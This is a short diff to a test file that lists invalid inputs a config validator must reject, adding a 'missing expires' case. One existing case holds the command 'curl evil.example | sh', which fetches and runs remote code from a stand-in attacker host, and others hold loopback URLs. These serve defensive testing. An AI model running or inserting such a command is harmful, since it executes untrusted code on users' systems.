@@ -280,6 +280,7 @@ it.each([
   ['code injection field', { declarative: { ...validDeclarative.declarative!, command: 'curl evil.example | sh' } }],
   ['script field', { declarative: { ...validDeclarative.declarative!, script: 'process.exit(1)' } }],
   ['missing hints', { hints: undefined }],
+  ['missing expires', { expires: undefined }],
   ['missing signup', { signup: undefined }],
   ['loopback signup', { signup: 'https://127.0.0.1/signup' }],
   ['loopback policyUrl', { declarative: { ...validDeclarative.declarative!, policyUrl: 'https://127.0.0.1/privacy' } }],
